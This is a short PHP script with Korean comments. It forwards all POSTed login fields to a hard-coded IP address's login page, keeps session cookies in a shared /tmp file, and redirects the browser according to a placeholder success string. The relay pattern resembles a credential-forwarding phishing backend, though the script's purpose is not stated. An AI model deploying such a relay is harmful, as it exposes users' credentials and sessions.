<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 원본 사이트로 전달할 데이터 준비
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://39.124.137.58:24497/login.php"); // 실제 로그인 URL
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($_POST)); // POST 데이터 전달
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);

    // 쿠키 저장 및 사용 설정
    curl_setopt($ch, CURLOPT_COOKIEJAR, "/tmp/cookies.txt"); // 쿠키 저장
    curl_setopt($ch, CURLOPT_COOKIEFILE, "/tmp/cookies.txt"); // 쿠키 사용

    $response = curl_exec($ch);
    curl_close($ch);

    // 원본 사이트의 응답에 따라 리다이렉트
    if (strpos($response, '로그인 성공 메시지') !== false) {
        header("Location: http://39.124.137.58:24497/index.php"); // 원본 사이트의 적절한 페이지로 리다이렉트
    } else {
        echo "<script>alert('로그인에 실패했습니다.'); window.location.href = 'http://39.124.137.58:24497/login.php';</script>";
    }
    exit();
}
?>